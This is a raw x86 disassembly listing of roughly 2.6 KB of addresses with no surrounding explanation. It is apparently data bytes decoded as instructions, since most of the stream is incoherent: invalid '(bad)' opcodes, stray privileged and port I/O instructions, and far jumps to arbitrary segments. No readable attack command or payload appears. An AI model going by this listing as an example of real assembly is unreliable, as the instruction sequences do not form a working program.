  422b8e:	sub    DWORD PTR [edx+edx*4],ebx
  422b91:	add    BYTE PTR [edx-0x23ef57ce],cl
  422b97:	aas    
  422b98:	fld    TBYTE PTR [esi+0x38]
  422b9b:	test   eax,0xd028a20d
  422ba0:	cmp    eax,0xf0e15b41
  422ba5:	push   edx
  422ba6:	cdq    
  422ba7:	adc    ah,cl
  422ba9:	icebp  
  422baa:	retf   
  422bab:	mov    ecx,0x44823dd1
  422bb0:	xchg   edi,eax
  422bb1:	call   DWORD PTR ds:0x58aafbb6
  422bb7:	mov    al,0x26
  422bb9:	js     0x422b94
  422bbb:	or     eax,ebx
  422bbd:	pop    eax
  422bbe:	loopne 0x422bfe
  422bc0:	xor    BYTE PTR [ebx-0x7c],dl
  422bc3:	leave  
  422bc4:	xor    al,0x1c
  422bc6:	fs retf 0xe6f9
  422bca:	mov    cl,0x5d
  422bcc:	or     DWORD PTR [edi+0x23a8a99f],edx
  422bd2:	jmp    0x422c49
  422bd4:	xchg   ebp,eax
  422bd5:	icebp  
  422bd6:	(bad)  
  422bd7:	les    eax,FWORD PTR [edi]
  422bd9:	div    BYTE PTR [edx]
  422bdb:	jmp    DWORD PTR [edi-0x4447bb05]
  422be1:	inc    eax
  422be2:	jge    0x422c0b
  422be4:	xor    ecx,DWORD PTR [edi-0xd]
  422be7:	dec    ebp
  422be8:	adc    BYTE PTR [ecx+0x6b],dh
  422beb:	and    al,0xd5
  422bed:	and    DWORD PTR [eax],eax
	...
  422c53:	add    BYTE PTR [eax],al
  422c55:	add    BYTE PTR [edi+esi*1+0x4a],al
  422c59:	fwait
  422c5a:	jnp    0x422c5b
  422c5c:	aad    0xff
  422c5e:	sbb    dl,BYTE PTR [edx-0x2b27b264]
  422c64:	mov    bl,0x63
  422c66:	addr16 jne 0x422c6a
  422c69:	add    BYTE PTR [eax],al
  422c6b:	add    DWORD PTR [eax],eax
  422c6d:	add    BYTE PTR [ecx+0x2b],al
  422c70:	inc    esi
  422c71:	sbb    eax,0xa0db4ee2
  422c76:	sub    al,0xed
  422c78:	loopne 0x422ccd
  422c7a:	fdivr  QWORD PTR [edx+0x64a792a8]
  422c80:	mov    al,ds:0xc738e492
  422c85:	aam    0x59
  422c87:	sbb    al,0x75
  422c89:	in     al,0xe3
  422c8b:	jg     0x422c51
  422c8d:	mov    BYTE PTR [edx+0x22],ch
  422c90:	adc    eax,0x37e7cebd
  422c95:	stos   BYTE PTR es:[edi],al
  422c96:	xchg   esi,eax
  422c97:	fsubr  st,st(1)
  422c99:	jb     0x422ccf
  422c9b:	cmp    dl,ah
  422c9d:	mov    ch,0x44
  422c9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ca0:	in     al,dx
  422ca1:	sub    BYTE PTR ds:0x9e0b0250,al
  422ca7:	mov    WORD PTR [eax],?
  422ca9:	pop    ebp
  422caa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cab:	push   ebx
  422cac:	jo     0x422ca3
  422cae:	adc    dl,bl
  422cb0:	addr16 xor al,0xf0
  422cb3:	in     eax,dx
  422cb4:	xor    dl,BYTE PTR [eax+0xa]
  422cb7:	loopne 0x422d1e
  422cb9:	or     DWORD PTR [esi+0x70],esp
  422cbc:	sbb    eax,edx
  422cbe:	mov    edx,0x81800e6b
  422cc3:	pusha  
  422cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cc5:	pop    ss
  422cc6:	repz mov gs,WORD PTR [edi-0x752a0f4b]
  422ccd:	daa    
  422cce:	pop    eax
  422ccf:	cmc    
  422cd0:	loope  0x422d4d
  422cd2:	xor    ebp,DWORD PTR [ebx]
  422cd4:	dec    ebx
  422cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cd6:	iret   
  422cd7:	popa   
  422cd8:	adc    edx,DWORD PTR [esi]
  422cda:	pop    esp
  422cdb:	outs   dx,BYTE PTR ds:[esi]
  422cdc:	sub    eax,0x46b8704d
  422ce1:	iret   
  422ce2:	fcmovnb st,st(1)
  422ce4:	inc    ebp
  422ce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ce6:	mov    ebp,0xf5381383
  422ceb:	sub    DWORD PTR [edx-0x13],esi
  422cee:	or     eax,0xa60b3e15
  422cf3:	jno    0x422d28
  422cf5:	inc    ebx
  422cf6:	jb     0x422d18
  422cf8:	sbb    BYTE PTR [eax],0x57
  422cfb:	cs jae 0x422cdf
  422cfe:	jg     0x422d6e
  422d00:	xchg   ecx,eax
  422d01:	sub    al,0x4d
  422d03:	push   edx
  422d04:	sbb    al,0x6b
  422d06:	inc    ebx
  422d07:	fstp   QWORD PTR [eax-0x32b0b36e]
  422d0d:	sahf   
  422d0e:	mov    WORD PTR [ecx],cs
  422d10:	sti    
  422d11:	jns    0x422d0a
  422d13:	sub    ebx,DWORD PTR [ebx+esi*2+0x53]
  422d17:	dec    ebx
  422d18:	adc    WORD PTR [ebp-0x64],0xc74f
  422d1e:	inc    esi
  422d1f:	js     0x422d8b
  422d21:	frstor [esi+0x56]
  422d24:	ins    DWORD PTR es:[edi],dx
  422d25:	mov    dh,0x7
  422d27:	add    dh,ch
  422d29:	lahf   
  422d2a:	pop    ebx
  422d2b:	fidivr DWORD PTR [eax+esi*1-0x45]
  422d2f:	pop    esp
  422d30:	lods   eax,DWORD PTR ds:[esi]
  422d31:	xchg   ebx,eax
  422d32:	aaa    
  422d33:	test   eax,0xb5815f65
  422d38:	iret   
  422d39:	mov    ebx,0xfc10d397
  422d3e:	pop    esi
  422d3f:	std    
  422d40:	push   esp
  422d41:	nop
  422d42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d43:	mov    ebx,DWORD PTR [ecx]
  422d45:	mov    ds:0x574baf6c,eax
  422d4a:	shl    BYTE PTR [ecx-0x4f],1
  422d4d:	pop    esp
  422d4e:	cmp    DWORD PTR [ebx+0x204e9f9a],0x32
  422d55:	dec    ebp
  422d56:	xchg   ecx,eax
  422d57:	outs   dx,DWORD PTR ds:[esi]
  422d58:	pushf  
  422d59:	daa    
  422d5a:	ret    0xd8b5
  422d5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d5e:	pushf  
  422d5f:	pop    es
  422d60:	rcr    ebx,cl
  422d62:	jns    0x422d64
  422d64:	cmc    
  422d65:	xor    DWORD PTR [ebp-0x62423df6],ebx
  422d6b:	mov    esi,0xb517
	...
  422dd4:	add    BYTE PTR [eax],al
  422dd6:	mov    edi,0x626d60bd
  422ddb:	std    
  422ddc:	mov    edi,0x80797fff
  422de1:	sub    ecx,esi
  422de3:	mov    esi,DWORD PTR [esi+0x176679e]
  422de9:	add    BYTE PTR [eax],al
  422deb:	add    DWORD PTR [eax],eax
  422ded:	add    BYTE PTR [edi-0x4],bl
  422df0:	pop    esi
  422df1:	mov    eax,0xb87aee3
  422df6:	aas    
  422df7:	xor    ebx,DWORD PTR [ebp+eax*1-0x5f]
  422dfb:	add    eax,0x56dee7ab
  422e00:	jl     0x422e2a
  422e02:	jb     0x422dfa
  422e04:	pop    edi
  422e05:	sbb    cl,BYTE PTR [ebx-0x25224025]
  422e0b:	xor    DWORD PTR [esi-0x66],edi
  422e0e:	js     0x422e50
  422e10:	(bad)  
  422e11:	push   0x2811bc5a
  422e16:	add    edx,DWORD PTR ds:0xbcb0d279
  422e1c:	or     DWORD PTR [edx-0x51],ebx
  422e1f:	rcr    BYTE PTR [eax+0x46],1
  422e22:	xlat   BYTE PTR ds:[ebx]
  422e23:	retf   
  422e24:	stc    
  422e25:	push   es
  422e26:	popf   
  422e27:	jne    0x422ddf
  422e29:	jge    0x422de6
  422e2b:	shl    DWORD PTR [edx-0x7a],1
  422e2e:	es mov bh,0xb2
  422e31:	dec    ebp
  422e32:	test   eax,0x9629da9f
  422e37:	jmp    0x324b85a0
  422e3c:	aam    0xbd
  422e3e:	out    dx,eax
  422e3f:	xor    DWORD PTR [edi+0x794a766],esi
  422e45:	repnz jecxz 0x422e22
  422e48:	jne    0x422de7
  422e4a:	lea    esi,[edi-0x42cefe10]
  422e50:	into   
  422e51:	dec    ebx
  422e52:	shl    bl,1
  422e54:	mov    edx,0x4c7a7742
  422e59:	mov    ds:0xe1c36221,al
  422e5e:	jne    0x422e05
  422e60:	mov    edx,cs
  422e62:	jb     0x422e14
  422e64:	jne    0x422edb
  422e66:	dec    esi
  422e67:	fwait
  422e68:	and    bh,BYTE PTR [ebp+0x12]
  422e6b:	je     0x422e26
  422e6d:	lods   eax,DWORD PTR ds:[esi]
  422e6e:	adc    BYTE PTR [edi],bh
  422e70:	stc    
  422e71:	repnz or DWORD PTR [ecx],esp
  422e74:	jnp    0x422dfd
  422e76:	icebp  
  422e77:	fucomip st,st(0)
  422e79:	and    esi,DWORD PTR [ecx]
  422e7b:	js     0x422ec3
  422e7d:	mov    BYTE PTR [edx],ch
  422e7f:	or     al,0xd
  422e81:	sbb    ecx,edx
  422e83:	pushf  
  422e84:	dec    esi
  422e85:	cs das 
  422e87:	and    eax,0x869283fe
  422e8c:	(bad)
  422e91:	and    eax,0xda6d1e58
  422e96:	xor    DWORD PTR [edi+0x52],eax
  422e99:	lock push esp
  422e9b:	aad    0x87
  422e9d:	xor    esp,esi
  422e9f:	mov    ds:0x5202bd2b,eax
  422ea4:	rcr    al,1
  422ea6:	push   cs
  422ea7:	aaa    
  422ea8:	enter  0xb651,0x43
  422eac:	arpl   WORD PTR [ecx+eiz*2],ax
  422eaf:	dec    ebx
  422eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422eb1:	pop    edx
  422eb2:	xchg   DWORD PTR [edi+ecx*2+0x7e0f1410],ebp
  422eb9:	sub    al,0x9b
  422ebb:	sub    al,0x5f
  422ebd:	shl    DWORD PTR [eax+0x13adcc96],0x4d
  422ec4:	aaa    
  422ec5:	ror    eax,0x8c
  422ec8:	retf   0x912d
  422ecb:	and    BYTE PTR [edx],cl
  422ecd:	scas   al,BYTE PTR es:[edi]
  422ece:	xchg   esp,eax
  422ecf:	int    0x46
  422ed1:	int    0xc6
  422ed3:	adc    edi,DWORD PTR [ebx]
  422ed5:	or     al,0x97
  422ed7:	push   ds
  422ed8:	fst    DWORD PTR [ecx]
  422eda:	pop    edi
  422edb:	mov    ebp,0x305395d7
  422ee0:	inc    esi
  422ee1:	xor    ebx,ebp
  422ee3:	cmp    DWORD PTR [edi+0x48eb8c1],0xffffff9d
  422eea:	stos   DWORD PTR es:[edi],eax
  422eeb:	jge    0x422efc
  422eed:	iret   
	...
  422f56:	adc    DWORD PTR [ebp-0x78],0x19
  422f5a:	(bad)  
  422f5c:	xchg   ebx,eax
  422f5d:	fisttp WORD PTR [eax]
  422f5f:	mov    eax,0xc9ddca33
  422f64:	aas    
  422f65:	scas   eax,DWORD PTR es:[edi]
  422f66:	addr16 ja 0x422f6a
  422f69:	add    BYTE PTR [eax],al
  422f6b:	add    DWORD PTR [eax],eax
  422f6d:	add    BYTE PTR [ecx-0x6f],ah
  422f70:	push   0xffffff8d
  422f72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f74:	pop    esp
  422f75:	lea    ebx,[ecx+0x4deb47e8]
  422f7b:	xchg   esi,esi
  422f7d:	addr16 popa 
  422f7f:	cmp    DWORD PTR [ebx+ebx*2],esi
  422f82:	cwde   
  422f83:	rol    DWORD PTR [ebx],cl
  422f85:	lods   al,BYTE PTR ds:[esi]
  422f86:	xor    dl,dh
  422f88:	ret    0xcda6
  422f8b:	pop    esi
  422f8c:	sar    DWORD PTR [ebx-0xa7b67a8],cl
  422f92:	pop    ds
  422f93:	mov    esp,0x66b5e7fe
  422f98:	jnp    0x423012
  422f9a:	scas   eax,DWORD PTR es:[edi]
  422f9b:	jns    0x422fd4
  422f9d:	ffree  st(1)
  422f9f:	adc    ecx,esp
  422fa1:	popa   
  422fa2:	dec    edx
  422fa3:	or     BYTE PTR ss:[edi],ah
  422fa6:	jo     0x422f54
  422fa8:	inc    esp
  422fa9:	lock add dl,bh
  422fac:	sahf   
  422fad:	shl    BYTE PTR [ecx+0x4ab667eb],1
  422fb3:	js     0x422fd7
  422fb5:	jnp    0x422ff7
  422fb7:	lock js 0x422fec
  422fba:	int    0x8c
  422fbc:	mov    eax,ds:0x73c0a973
  422fc1:	adc    eax,esi
  422fc3:	inc    ebx
  422fc4:	fsubr  QWORD PTR [edi+0x28]
  422fc7:	daa    
  422fc8:	retf   
  422fc9:	xlat   BYTE PTR ds:[ebx]
  422fca:	(bad)  
  422fcb:	dec    ebp
  422fcc:	xor    eax,0x19b7882d
  422fd1:	neg    BYTE PTR [edx+0x21a267f0]
  422fd7:	stos   BYTE PTR es:[edi],al
  422fd8:	scas   eax,DWORD PTR es:[edi]
  422fd9:	mov    ecx,0xe968f65f
  422fde:	xchg   cl,dh
  422fe0:	xor    bl,ch
  422fe2:	jmp    0x423017
  422fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fe5:	and    eax,0xf6c6f8c7
  422fea:	add    ah,al
  422fec:	or     bl,BYTE PTR [esi]
  422fee:	xor    DWORD PTR [eax+0x5cd1bab8],ecx
  422ff4:	(bad)  
  422ff5:	cdq    
  422ff6:	mov    esi,ecx
  422ff8:	push   esi
  422ff9:	(bad)  
  422ffa:	fmulp  st(0),st
  422ffc:	mov    eax,ds:0xa7f1668
  423001:	lods   eax,DWORD PTR ds:[esi]
  423002:	add    dl,BYTE PTR [esi]
  423004:	ret    0xb07f
  423007:	std    
  423008:	aaa    
  423009:	xchg   edi,eax
  42300a:	outs   dx,BYTE PTR ds:[esi]
  42300b:	push   cs
  42300c:	ret    
  42300d:	xor    al,0xe1
  42300f:	arpl   WORD PTR [eax+ebx*1],bx
  423012:	pop    eax
  423013:	icebp  
  423014:	inc    ecx
  423015:	shl    edx,cl
  423017:	push   0xfffffff7
  423019:	dec    ebx
  42301a:	pop    ds
  42301b:	outs   dx,BYTE PTR ds:[esi]
  42301c:	in     al,0x2b
  42301e:	in     al,dx
  42301f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423020:	and    BYTE PTR ds:0xbc0450dc,al
  423026:	mov    bh,0x46
  423028:	inc    edx
  423029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42302a:	mov    edi,0x2791b66a
  42302f:	aad    0x3
  423031:	lahf   
  423032:	fist   WORD PTR [ecx]
  423034:	fist   WORD PTR [ebp-0x74]
  423037:	adc    esi,DWORD PTR [ebx+0x26d1cf37]
  42303d:	(bad)  
  42303f:	xchg   ecx,eax
  423040:	jns    0x422fe5
  423042:	fmul   DWORD PTR [esi]
  423044:	dec    eax
  423045:	lea    esi,[eax-0x47]
  423048:	stos   DWORD PTR es:[edi],eax
  423049:	nop
  42304a:	fcmovnb st,st(1)
  42304c:	popf   
  42304d:	ins    BYTE PTR es:[edi],dx
  42304e:	dec    edi
  42304f:	cmp    BYTE PTR [esi],bl
  423051:	lds    esp,FWORD PTR [edx]
  423053:	ins    BYTE PTR es:[edi],dx
  423054:	sti    
  423055:	xchg   ebx,eax
  423056:	sti    
  423057:	add    eax,0x1aae03b5
  42305c:	add    al,0x1e
  42305e:	aad    0x92
  423060:	imul   ebp,DWORD PTR [eax+ecx*4],0x64344f9a
  423067:	xor    DWORD PTR [eax-0x57],eax
  42306a:	outs   dx,BYTE PTR ds:[esi]
  42306b:	fwait
  42306c:	cmp    cl,BYTE PTR [esi]
	...
  4230d6:	inc    esi
  4230d7:	in     al,0x62
  4230d9:	mov    dl,ah
  4230db:	mov    gs,esi
  4230dd:	out    dx,al
  4230de:	sub    ecx,ebx
  4230e0:	sbb    DWORD PTR [ebp+ebp*8+0x6768ec24],esp
  4230e7:	js     0x4230ea
  4230e9:	add    BYTE PTR [eax],al
  4230eb:	add    DWORD PTR [eax],eax
  4230ed:	add    BYTE PTR [eax],bl
  4230ef:	sub    ecx,DWORD PTR [esp-0x49]
  4230f3:	lods   al,BYTE PTR ds:[esi]
  4230f4:	cli    
  4230f5:	int3   
  4230f6:	in     al,0xa6
  4230f8:	sub    ch,BYTE PTR [edi]
  4230fa:	popf   
  4230fb:	jp     0x4230ab
  4230fd:	retf   
  4230fe:	sbb    edi,DWORD PTR [ebx+0x58]
  423101:	ret    0x563e
  423104:	push   ecx
  423105:	shl    BYTE PTR [ecx+0x74],0xd7
  423109:	lea    edx,[edx+0x291711c1]
  42310f:	xchg   esp,eax
  423110:	dec    esi
  423111:	ins    BYTE PTR es:[edi],dx
  423112:	jbe    0x4230da
  423114:	and    al,0x97
  423116:	pop    es
  423117:	jmp    0x423104
  423119:	cmp    bh,ch
  42311b:	push   edx
  42311c:	mov    ebx,0x667ee750
  423121:	popw   ds
  423123:	test   edx,0x2460a695
  423129:	add    edi,DWORD PTR [eax]
  42312b:	cmp    BYTE PTR [ebx],0x4f
  42312e:	sub    ecx,DWORD PTR [eax]
  423130:	in     eax,0x15
  423132:	ins    DWORD PTR es:[edi],dx
  423133:	fistp  QWORD PTR [esp+esi*4-0x7c7c6290]
  42313a:	ret    
  42313b:	or     DWORD PTR [edx+0x6ffd9df2],edx
  423141:	in     eax,dx
  423142:	mov    al,ds:0x410e7463
  423147:	xor    eax,0x68aecd35
  42314c:	add    DWORD PTR [ebx],edx
  42314e:	out    0x3c,al
  423150:	imul   esi,DWORD PTR [eax-0x6b],0xffffffa8
  423154:	bound  ebp,QWORD PTR [esp+eax*8+0x3f775ad4]
  42315b:	aaa    
  42315c:	pop    eax
  42315d:	xor    ebp,DWORD PTR [edx]
  42315f:	scas   al,BYTE PTR es:[edi]
  423160:	sub    ebp,DWORD PTR [ebp-0x1a5937c0]
  423166:	add    eax,0xd20b2c2
  42316b:	loopne 0x423138
  42316d:	push   ebp
  42316e:	pop    edi
  42316f:	push   ds
  423170:	test   al,0x41
  423172:	mov    esi,0x22e12981
  423177:	nop
  423178:	adc    BYTE PTR [edx-0x2a2332d],ch
  42317e:	sbb    bl,BYTE PTR [ebx]
  423180:	cwde   
  423181:	mov    cs,WORD PTR [edx+ebx*1+0x32]
  423185:	fld    DWORD PTR [edi]
  423187:	adc    dh,dl
  423189:	push   0x19
  42318b:	fwait
  42318c:	mov    dl,0xc0
  42318e:	add    BYTE PTR [edx+ebp*1-0x5d58b198],cl
  423195:	jo     0x4231eb
  423197:	mov    ecx,0xfe093898
  42319c:	pop    es
  42319d:	adc    al,0xbd
  42319f:	das    
  4231a0:	cmp    esi,DWORD PTR [ecx-0x4eba7f79]
  4231a6:	pop    eax
  4231a7:	(bad)
  4231aa:	pop    ss
  4231ab:	sub    bl,BYTE PTR [edx-0x76]
  4231ae:	jns    0x4231c2
  4231b0:	scas   eax,DWORD PTR es:[edi]
  4231b1:	popf   
  4231b2:	dec    edi
  4231b3:	jno    0x4231bf
  4231b5:	pushf  
  4231b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231b7:	xor    ebx,DWORD PTR [edi+esi*8]
  4231ba:	repnz add ebx,DWORD PTR [ebx-0x49]
  4231be:	pop    ss
  4231bf:	fdiv   QWORD PTR [ecx+0x5e]
  4231c2:	pop    ebx
  4231c3:	pushf  
  4231c4:	and    ah,ch
  4231c6:	fidivr WORD PTR [edi]
  4231c8:	inc    ebx
  4231c9:	retf   0x474d
  4231cc:	test   eax,ecx
  4231ce:	retf   0x2665
  4231d1:	jmp    0x4231c4
  4231d3:	in     al,dx
  4231d4:	shl    BYTE PTR [edx-0x17bed967],1
  4231da:	adc    al,0x2b
  4231dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231dd:	inc    ebp
  4231de:	xchg   bl,bl
  4231e0:	mov    dl,0xc5
  4231e2:	out    0x1d,al
  4231e4:	xchg   DWORD PTR [ebp-0x10c78247],ecx
  4231ea:	inc    ebx
  4231eb:	loope  0x42323c
  4231ed:	add    BYTE PTR cs:[eax],al
	...
  423254:	add    BYTE PTR [eax],al
  423256:	jns    0x423249
  423258:	div    DWORD PTR [ecx-0x6804801]
  42325e:	in     al,0xe0
  423260:	sub    DWORD PTR [edx+0x694954bb],esp
  423266:	addr16 jns 0x42326a
  423269:	add    BYTE PTR [eax],al
  42326b:	add    DWORD PTR [eax],eax
  42326d:	add    BYTE PTR [esi+0x20],al
  423270:	or     esp,DWORD PTR [ecx]
  423272:	in     al,dx
  423273:	cmp    edx,DWORD PTR ss:[ebx+0x2a8831]
  42327a:	outs   dx,DWORD PTR ds:[esi]
  42327b:	outs   dx,DWORD PTR ds:[esi]
  42327c:	stc    
  42327d:	lock sti 
  42327f:	add    al,0xe2
  423281:	pop    es
  423282:	outs   dx,BYTE PTR ds:[esi]
  423283:	pop    esp
  423284:	xlat   BYTE PTR ds:[ebx]
  423285:	scas   al,BYTE PTR es:[edi]
  423286:	push   esi
  423287:	cmp    eax,0xefb1fcf
  42328c:	sub    al,0x91
  42328e:	mov    edi,fs
  423290:	ins    DWORD PTR es:[edi],dx
  423291:	sub    DWORD PTR [ebx+0x1098bc3b],0x416e3168
  42329b:	push   esi
  42329c:	in     al,dx
  42329d:	(bad)  
  42329e:	hlt    
  42329f:	jp     0x4232c0
  4232a1:	cmp    edx,DWORD PTR [edx+0x3a11285d]
  4232a7:	mov    ecx,0x553913cd
  4232ac:	or     edi,DWORD PTR [esi-0x34209c2f]
  4232b2:	sbb    esp,DWORD PTR [ecx-0x18]
  4232b5:	pusha  
  4232b6:	pop    esi
  4232b7:	mov    esp,0x13185844
  4232bc:	jp     0x4232eb
  4232be:	pop    ebx
  4232bf:	jecxz  0x4232e5
  4232c1:	or     al,0x30
  4232c3:	xchg   edi,eax
  4232c4:	aaa    
  4232c5:	xor    edi,DWORD PTR ds:0x871005d0
  4232cb:	xlat   BYTE PTR ds:[ebx]
  4232cc:	mov    esp,0xf50999b7
  4232d1:	push   esi
  4232d2:	or     al,0x45
  4232d4:	pop    esi
  4232d5:	les    ebp,FWORD PTR [edx+eax*1-0x3e6a4e75]
  4232dc:	clc    
  4232dd:	ins    BYTE PTR es:[edi],dx
  4232de:	imul   ebx,esp,0x5f
  4232e1:	(bad)  
  4232e2:	aaa    
  4232e3:	aaa    
  4232e4:	add    esi,DWORD PTR [esi-0x51]
  4232e7:	loopne 0x4232dc
  4232e9:	(bad)  
  4232ea:	xchg   ebx,eax
  4232eb:	mov    DWORD PTR [esi-0x42],ecx
  4232ee:	rcr    DWORD PTR [esi+esi*4-0x5a],1
  4232f2:	adc    cl,bh
  4232f4:	ja     0x423296
  4232f6:	pop    ecx
  4232f7:	sbb    BYTE PTR [esi],0x5a
  4232fa:	into   
  4232fb:	out    dx,eax
  4232fc:	repz gs mov ebp,0x3aded69f
  423303:	and    esp,eax
  423305:	pop    edi
  423306:	mov    ebp,0x830a6907
  42330b:	adc    edi,DWORD PTR [esi+0x3c]
  42330e:	adc    ebp,DWORD PTR [edi]
  423310:	xchg   edi,eax
  423311:	outs   dx,DWORD PTR ds:[esi]
  423312:	push   eax
  423313:	add    DWORD PTR [esp+edi*1+0x49],ebp
  423317:	sbb    bh,bl
  423319:	xlat   BYTE PTR es:[ebx]
  42331b:	dec    esp
  42331c:	add    al,0x29
  42331e:	scas   al,BYTE PTR es:[edi]
  42331f:	inc    ebx
  423320:	bound  ebx,QWORD PTR [ecx+0x42]
  423323:	pop    edx
  423324:	outs   dx,BYTE PTR ds:[esi]
  423325:	dec    eax
  423326:	mov    DWORD PTR [edx+eax*2-0x2a],ecx
  42332a:	ficomp WORD PTR [ecx+0x4f]
  42332d:	imul   edi,esp,0xffffffce
  423330:	test   DWORD PTR [eax+0x3f11513a],ecx
  423336:	add    eax,ebx
  423338:	(bad)
  42333c:	adc    bh,BYTE PTR [edi-0x48]
  42333f:	push   0xffffffd5
  423341:	push   0xa665e258
  423346:	lods   al,BYTE PTR ds:[esi]
  423347:	and    esi,edi
  423349:	dec    ebx
  42334a:	push   0xffffffea
  42334c:	and    DWORD PTR [edi],edx
  42334e:	and    al,0xee
  423350:	imul   eax,DWORD PTR [ebp+ecx*4-0x568ffe43],0x184e7add
  42335b:	or     eax,0xabe48820
  423360:	jns    0x423388
  423362:	push   es
  423363:	mov    esi,0xeb6cd54f
  423368:	(bad)
  42336b:	push   es
  42336c:	dec    ebp
  42336d:	ret    0x0
	...
  4233d4:	add    BYTE PTR [eax],al
  4233d6:	clc    
  4233d7:	fisub  WORD PTR [edx+0x30]
  4233da:	mov    sp,0xdefa
  4233de:	mov    eax,fs:0x83ac0f44
  4233e4:	adc    dh,BYTE PTR [eax+0x17a67]
  4233ea:	add    BYTE PTR [ecx],al
  4233ec:	add    BYTE PTR [eax],al
  4233ee:	std    
  4233ef:	ss xchg esp,eax
  4233f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233f2:	fist   WORD PTR [ebx+0x6627310e]
  4233f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233fa:	mul    BYTE PTR [ecx+esi*4+0x5768acd1]
  423401:	add    bh,dl
  423403:	push   ds
  423404:	jp     0x42344d
  423406:	out    0x49,al
  423408:	retf   0xab10
  42340b:	push   0x872df785
  423410:	cs xchg edx,eax
  423412:	repz mov al,BYTE PTR [ecx]
  423415:	sub    BYTE PTR [ebp-0x36385679],bh
  42341b:	pop    ecx
  42341c:	data16 into 
  42341e:	mov    cl,0x6e
  423420:	cmp    eax,DWORD PTR [edi]
  423422:	rcr    BYTE PTR [edx+0x33],0x2
  423426:	xchg   ecx,eax
  423427:	xchg   esi,eax
  423428:	and    DWORD PTR [edi+0x9],eax
  42342b:	add    esp,DWORD PTR [eax+0x8c4e253]
  423431:	test   al,0x2f
  423433:	lods   eax,DWORD PTR ds:[esi]
  423434:	in     eax,0x12
  423436:	push   ebx
  423437:	mov    esp,0x52aafb44
  42343c:	jmp    0xd356:0x7276ede9
  423443:	adc    ebx,DWORD PTR [eax-0x41]
  423446:	aad    0x92
  423448:	jo     0x4234be
  42344a:	and    al,0xd4
  42344c:	clc    
  42344d:	and    al,BYTE PTR [edi+0x643bc5fc]
  423453:	fild   DWORD PTR [eax+0x569b7c3]
  423459:	mov    ebp,0x1bd6b23b
  42345e:	add    al,0x3e
  423460:	and    ebp,DWORD PTR [ebx]
  423462:	xchg   edx,eax
  423463:	pop    ebx
  423464:	fidivr DWORD PTR [eax-0x2f]
  423467:	icebp  
  423468:	jo     0x423412
  42346a:	or     eax,DWORD PTR [ebp+0x43fb66e3]
  423470:	mov    edi,0xa978c9dc
  423475:	cmp    eax,0x2490fc8b
  42347a:	enter  0x2cda,0xdb
  42347e:	xor    al,0xb4
  423480:	add    al,0x3f
  423482:	popa   
  423483:	add    DWORD PTR [ecx],ecx
  423485:	jmp    0x632f:0x1a4330e0
  42348c:	add    BYTE PTR [ebp-0x6e],cl
  42348f:	stc    
  423490:	icebp  
  423491:	cmp    eax,0x2f70a0bc
  423496:	jns    0x4234a3
  423498:	adc    al,0xa8
  42349a:	sub    ebx,DWORD PTR [ebx]
  42349c:	push   0xa64c3f49
  4234a1:	mov    bh,0x53
  4234a3:	jbe    0x4234a4
  4234a5:	dec    esi
  4234a6:	adc    BYTE PTR [ebx+eax*8],bh
  4234a9:	fild   QWORD PTR [edi-0x1e]
  4234ac:	scas   al,BYTE PTR es:[edi]
  4234ad:	ret    
  4234ae:	push   ecx
  4234af:	xchg   esi,eax
  4234b0:	(bad)  [ecx]
  4234b2:	repz push edi
  4234b4:	dec    edi
  4234b5:	out    0xad,eax
  4234b7:	jg     0x423528
  4234b9:	or     DWORD PTR [ebp*4+0x349d8177],0xa80940e0
  4234c4:	mov    al,0x87
  4234c6:	rcl    BYTE PTR [edi+0x2ab40de0],1
  4234cc:	aaa    
  4234cd:	add    al,0x65
  4234cf:	adc    eax,0x47cfb11d
  4234d4:	sbb    eax,0x9f09b74
  4234d9:	test   al,0xe1
  4234db:	or     bh,BYTE PTR [ecx+0x64]
  4234de:	outs   dx,DWORD PTR ds:[esi]
  4234df:	je     0x423558
  4234e1:	xor    dh,ch
  4234e3:	retf   0xbe35
  4234e6:	mov    edx,es
  4234e8:	(bad)  
  4234e9:	sub    al,0xf4
  4234eb:	inc    eax
  4234ec:	leave  
  4234ed:	imul   eax,DWORD PTR [eax],0x0
	...
  423553:	add    BYTE PTR [eax],al
  423555:	add    al,al
  423557:	mov    al,0x45
  423559:	outs   dx,DWORD PTR ds:[esi]
  42355a:	jne    0x42355b
  42355c:	jmp    0xc11f:0xadf467bf
  423563:	stos   BYTE PTR es:[edi],al
  423564:	mov    ecx,0x17b67f9
  423569:	add    BYTE PTR [eax],al
  42356b:	add    DWORD PTR [eax],eax
  42356d:	add    BYTE PTR [ebp+0x73],ch
  423570:	out    0xc7,eax
  423572:	push   es
  423573:	and    al,BYTE PTR [ebp-0x3d0e5422]
  423579:	mov    ebx,0xe82e9956
  42357e:	mov    ecx,DWORD PTR [ebx-0x203fce2]
  423584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423585:	(bad)  [edi-0x10]
  423588:	sub    cl,BYTE PTR [ebx-0x7d]
  42358b:	jl     0x4235e6
  42358d:	test   BYTE PTR [ebx+0x2db0668c],ch
  423593:	xor    esp,edx
  423595:	add    eax,0xada37b83
  42359a:	and    edx,DWORD PTR [ecx+0x264e4555]
  4235a0:	arpl   bp,sp
  4235a2:	int    0x23
  4235a4:	stc    
  4235a5:	rcl    DWORD PTR ds:0x9342dd6,cl
  4235ab:	pop    ds
  4235ac:	cwde   
  4235ad:	xchg   ebp,eax
  4235ae:	in     eax,dx
  4235af:	or     DWORD PTR [ebx+0x63050be9],eax
  4235b5:	call   0x40e63851
